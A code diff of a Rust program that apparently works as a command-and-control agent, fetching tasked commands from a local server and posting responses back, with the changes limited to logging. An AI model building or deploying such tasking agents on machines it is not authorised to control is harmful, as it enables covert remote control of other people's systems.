@@ -17,13 +17,10 @@ fn getCommands2(){
         return
     }
     while count <= command_count{
-        // println!("Count:{}",format!("{}",count));
-        // println!("{}",res[format!("{}",count)]);
-        // println!("{}",res["1"]);
         let cmd_id = format!("{}",res[format!("{}",count)]["cmd_id"]);
         let command = format!("{}",res[format!("{}",count)]["command"]);
-        println!("Command ID: {}\nCommand: {}",&cmd_id, &command);
-        // println!("{}",res[count]);
+        print("Command Received:");
+        print(&format!("\tCommand ID: {}\n\tCommand: {}",&cmd_id, &command));
         count+=1;
         postResponse(&cmd_id, &command);
     }
@@ -35,10 +32,18 @@ fn runCommand(cmd_id:&str, command:&str){
 }
 
 fn postResponse(cmd_id: &str, response: &str){
-    println!("{}",response);
+    print(&format!("\tcmd_id: {}\n\tResponse: {}",cmd_id,response));
     let text = format!("{{\"cmd_id\": \"{}\",\"response\": \"{}\"}}",cmd_id,response);
     let client = reqwest::blocking::Client::new();
     let res = client.post("http://127.0.0.1:8080/hosts/Ubuntu1.1/responses").body(text).send().unwrap();
+    print("Successfully posted response to server.")
+}
+
+fn print(txt:&str){
+    let print_bool: bool = true;
+    if print_bool{
+        println!("{}",txt);
+    }
 }
 
 fn main(){
